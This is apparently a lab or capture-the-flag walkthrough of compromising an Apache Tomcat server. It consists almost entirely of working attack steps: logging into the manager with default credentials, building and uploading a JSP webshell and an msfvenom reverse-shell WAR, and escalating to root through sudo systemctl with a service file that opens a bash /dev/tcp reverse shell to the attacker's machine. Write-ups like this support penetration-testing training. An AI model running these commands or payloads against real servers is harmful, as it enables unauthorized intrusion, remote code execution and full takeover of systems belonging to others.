### Initial Discovery
```
# Web app on port 8080
http://10.10.10.40:8080
# Apache Tomcat/8.5.50

# Try default credentials
http://10.10.10.40:8080/manager/html
# Prompt for credentials
# admin:admin - success!
```

#### Deploy WAR Backdoor
```
# Create JSP reverse shell
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
%>
EOF

# Package as WAR
jar -cvf shell.war shell.jsp
```

#### Upload via Manager
```
# Upload using curl
curl -u admin:admin --upload-file shell.war "http://10.10.10.40:8080/manager/deploy?path=/shell"

# Verify deployment
curl http://10.10.10.40:8080/shell/shell.jsp?cmd=whoami
# tomcat
```

#### Get Reverse Shell
```
# Use msfvenom WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o revshell.war

# Upload
curl -u admin:admin --upload-file revshell.war "http://10.10.10.40:8080/manager/deploy?path=/revshell"

# Trigger
curl http://10.10.10.40:8080/revshell/
```

#### Privilege Escalation
```
# Check sudo for tomcat
sudo -l
# (root) NOPASSWD: /usr/bin/systemctl

# GTFOBins - systemctl can start services as root
# Create service
cat > /tmp/evil.service << 'EOF'
[Unit]
Description=Evil
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4445 0>&1'
User=root

[Install]
WantedBy=multi-user.target
EOF

# Copy to systemd
sudo systemctl link /tmp/evil.service
sudo systemctl start evil.service

# Get root shell
nc -lvnp 4445
# root@target:~#
```

